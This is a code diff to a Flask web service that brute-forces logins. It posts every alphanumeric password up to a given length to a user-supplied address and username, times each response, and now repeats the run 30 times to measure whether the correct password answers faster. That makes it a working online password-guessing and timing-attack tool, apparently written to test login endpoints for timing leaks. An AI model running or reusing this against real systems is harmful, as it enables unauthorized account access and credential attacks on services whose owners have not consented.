@@ -2,6 +2,8 @@ from flask import Flask, request, send_file, jsonify
 from flask_restplus import Resource, Api, reqparse, fields
 from flask_cors import CORS
 
+import numpy as np
+
 from werkzeug.exceptions import BadRequest
 
 #from celery import Celery
@@ -16,9 +18,8 @@ from itertools import product
 
 chars = digits + ascii_uppercase + ascii_lowercase
 
-
 def password_generator(digits):
-    for n in range(1, 4 + 1):
+    for n in range(1, digits + 1):
         for comb in product(chars, repeat=n):
             yield(''.join(comb))
 
@@ -33,20 +34,25 @@ def primary_attack(address, digits, username):
     data = {}
     passwords = password_generator(digits)
     for password in passwords:
-        print(password)
         start = time.perf_counter()
-        req = requests.post(address, auth=(username, password))
+        req = requests.post(address, data={'username':username, 'password':password})
         end = time.perf_counter()
-        elapsed_time = start - end
+        elapsed_time = end - start
         data['time'] = elapsed_time
-        data['code'] = req.status_code
+        data['resp'] = req.status_code
+        data['password'] = password
         timings.append(data)
         if req.ok == True:
             return timings
         data = {}
 
-
-
+def check_vulnerable(timings):
+    times = [timing['time'] for timing in timings]
+    passwords = [timing['password'] for timing in timings]
+    corr_time = [timing['time'] for timing in timings if timing['resp'] == 201]
+    mean = np.mean(times)
+    print('correct password was {0:.4f} ms faster'.format(float(mean - corr_time[0])*1000))
+    return(mean)
 
 def create_app():
     app = Flask(__name__)
@@ -71,14 +77,17 @@ def create_app():
         @ns.expect(params)
         @ns.marshal_with(params)
         def post(self):
+            test = []
             data = api.payload
-            print(data)
             address = data['address']
             digits = data['digits']
             username = data['username']
-            resultname = primary_attack(address, digits, username)
-
-            return(resultname)
+            for x in range(30):
+                timings = primary_attack(address, digits, username)
+                test.append(check_vulnerable(timings))
+            print(np.mean(test))
+            print('Results: correct password is {0:.4f} ms faster than average of all results'.format(float(np.mean(test))))
+            return(np.mean(test))
 
 
     @ns.route('/results')
@@ -103,5 +112,4 @@ def create_app():
 
 if __name__ == '__main__':
     app = create_app()
-
     app.run(debug=True)
